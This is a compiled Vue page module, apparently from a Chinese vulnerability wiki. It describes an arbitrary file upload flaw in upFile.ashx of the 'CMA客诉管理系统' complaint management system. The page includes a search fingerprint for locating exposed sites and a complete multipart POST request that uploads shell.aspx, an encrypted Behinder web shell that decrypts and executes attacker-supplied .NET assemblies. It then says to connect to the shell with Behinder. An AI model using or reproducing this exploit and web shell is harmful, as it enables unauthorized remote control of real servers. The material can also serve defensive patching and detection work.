import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as i,c as a,e as n}from"./app-58e4a7d6.js";const t={},l=n(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>CMA客诉管理系统 upFile.ashx文件存在任意文件上传漏洞，通过漏洞攻击者可以上传任意文件控制服务器</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>CMA客诉管理系统
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>title=&quot;CMA客诉管理系统手机端&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241430645.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>发送请求包上传文件</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /upFile/upFile.ashx HTTP/1.1
Host: 
Content-Length: 562
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymXf9pBIUlDVOYtnZ
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Connection: close

------WebKitFormBoundarymXf9pBIUlDVOYtnZ
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.aspx&quot;
Content-Type: application/octet-stream

&lt;%@ Page Language=&quot;C#&quot; %&gt;&lt;%@Import Namespace=&quot;System.Reflection&quot;%&gt;&lt;%Session.Add(&quot;k&quot;,&quot;e45e329feb5d925b&quot;);byte[] k = Encoding.Default.GetBytes(Session[0] + &quot;&quot;),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance(&quot;U&quot;).Equals(this);%&gt;

------WebKitFormBoundarymXf9pBIUlDVOYtnZ--
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241430324.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>发送后回显路径，使用冰蝎连接</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241430125.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,14),s=[l];function d(r,o){return i(),a("div",null,s)}const m=e(t,[["render",d],["__file","CMA客诉管理系统 upFile.ashx 任意文件上传漏洞.html.vue"]]);export{m as default};
